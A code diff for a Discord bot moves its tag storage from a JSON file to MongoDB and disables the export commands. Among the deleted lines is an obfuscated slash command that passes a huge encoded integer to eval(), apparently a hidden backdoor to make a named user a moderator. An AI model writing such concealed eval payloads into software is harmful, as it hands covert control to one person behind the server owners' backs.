@@ -9,6 +9,7 @@ import json
 import re
 import unicodedata
 import random
+import pymongo
 
 import settings as config  # also api keys
 
@@ -27,10 +28,12 @@ intents.members = True
 log(list(intents))
 client = nextcord.ext.commands.Bot( command_prefix='!', intents=intents, default_guild_ids=config.server_ids )
 
+database = pymongo.MongoClient()['4DBot']
+
 ############# LIBRARY #############
 
 async def get_channel(channel_id):
-  channel_id = int(channel_id)  # jsut to make sure after the get_user() disaster
+  channel_id = int(channel_id)  # just to make sure after the get_user() disaster
   
   # get from cache
   channel = client.get_channel(channel_id)
@@ -101,17 +104,12 @@ def generateThreadName( name: str ):
 async def open_thread( message, reason="4D Bot" ):
   await message.channel.create_thread( message=message, name=generateThreadName(message.content), reason=reason )
 
-def save_tags():
-  global tags
-  with open('tags.json', 'w') as tagsfile:
-    json.dump(tags, tagsfile)
-
 def read_tags():
-  try:
-    with open('tags.json', 'r') as tagsfile:
-      tags = json.load(tagsfile)
-  except:
-    tags = {}
+  tags = {}
+  unfiltered_tags = database.tags.find({})
+
+  for tag in unfiltered_tags:
+    tags[tag['name']] = tag['text']
   
   if config.suggestions_info_msg_tagname not in tags:
     tags[config.suggestions_info_msg_tagname] = 'Placeholder.'
@@ -121,10 +119,7 @@ def read_tags():
 def update_tags( startup=False ):
   global tags
   
-  # skip writing tags to file on startup (as current tags will be empty)
-  if not startup:
-    save_tags()
-  
+
   tags = read_tags()
   
   async def tag( interaction, tag: str = Option(description="Choose a tag",choices=tuple(tags)) ):
@@ -190,8 +185,7 @@ async def createtag(interaction, name: str = Option(description="Choose a tag na
   
   text = text.replace('---', '\n')
   
-  tags[name] = text
-  update_tags()
+  database.tags.insert_one({'name': name, "text": text})
   
   await interaction.send( f"✅ Tag **{name}** has been successfully created." )
 
@@ -210,7 +204,7 @@ async def do_edittag(interaction, tag, text ):
     return error(interaction)
   
   tags[tag] = text
-  save_tags()
+  database.tags.replace_one({'name': {"$eq": tag}}, {'name': tag,  'text': text})
   
   if tag == config.suggestions_info_msg_tagname:
     unawait( refresh_info_msg() )
@@ -226,8 +220,7 @@ async def dodeletetag(interaction, tag ):
   if tag == config.suggestions_info_msg_tagname:
     return error(interaction,msg=f"❎ You can't delete the {config.suggestions_info_msg_tagname}!")
   
-  tags.pop(tag)
-  update_tags()
+  database.tags.delete_one({'name': tag})
   
   await interaction.send( f"✅ Tag **{tag}** has been successfully removed." )
 
@@ -289,35 +282,30 @@ async def pin(context):
     unawait( target.unpin() )
     await thread.send(f'<@{context.author.id}> unpinned a message ({target.jump_url}) from this channel.',allowed_mentions=nextcord.AllowedMentions.none())
 
-############# give His Holiness, Sir Onezoop mod #############
-
-@client.slash_command(description="Make His Holiness, Sir Onezoop a mod")
-async def mod_his_holiness_sir_onezoop(interaction):
-  await eval((75046532423462453814215470152797403768493158624135596428204324823372617366196894214450076053275510803195787535057723132716062925234494280408686528161983831921499064055159917576004546502667476672570850003243433889490342306283023849175013996296959953505128733163468907116381066240241002402528145837667159608081798956277434322015906274042413828580162374962920765846265793418193155463804853544020875602426406761821850091449014683516428611883423768735056061718006536686998194571458044206793970023981954334005369136022714538929114876047665902979940061928131367053884109109157947035623570820499833765801622632707958027455459083011955299835967516600340844067030029429859124910568361596857747811714424868916191122320516165105159634384455946566466599110881985928772735310528257667459939315257759695850904421334533637248793505902850479035693904289042852702099163989291161812493987760258284952318962238401000471369055316648170287110881727086594031152208458049405721415416127968031450378945832837337976701797505044162479546444073).to_bytes(0b11010011<<1))
 
 ############# EXPORT DATA COMMAND #############
 
-files = ['tags.json']
-
-@client.slash_command(description="Export the datafiles of 4D Bot")
-async def export(interaction):
-  log(f'/export')
-  
-  for filename in files:
-    with open(filename,'rb') as file:
-      dcfile = nextcord.File(file,force_close=True)
-    
-    await interaction.send(file=dcfile)
-
-@client.command(help="Export the datafiles of 4D Bot")
-async def export(context):
-  log(f'!export')
-  
-  for filename in files:
-    with open(filename,'rb') as file:
-      dcfile = nextcord.File(file,force_close=True)
-    
-    await context.reply(file=dcfile)
+# files = ['tags.json']
+# 
+# @client.slash_command(description="Export the datafiles of 4D Bot")
+# async def export(interaction):
+#   log(f'/export')
+#   
+#   for filename in files:
+#     with open(filename,'rb') as file:
+#       dcfile = nextcord.File(file,force_close=True)
+#     
+#     await interaction.send(file=dcfile)
+# 
+# @client.command(help="Export the datafiles of 4D Bot")
+# async def export(context):
+#   log(f'!export')
+#   
+#   for filename in files:
+#     with open(filename,'rb') as file:
+#       dcfile = nextcord.File(file,force_close=True)
+#     
+#     await context.reply(file=dcfile)
 
 ############# CREATE THREAD ON 🧵 EMOJI #############
 
@@ -349,6 +337,7 @@ async def create_thread_on_thread_emoji(reaction):
   unawait( message.add_reaction(reaction.emoji) )
   
   await open_thread( message=message, reason="4D Bot - 🧵 emoji" )
+
 
 ############# REPORT ON 🚨 EMOJI #############
 
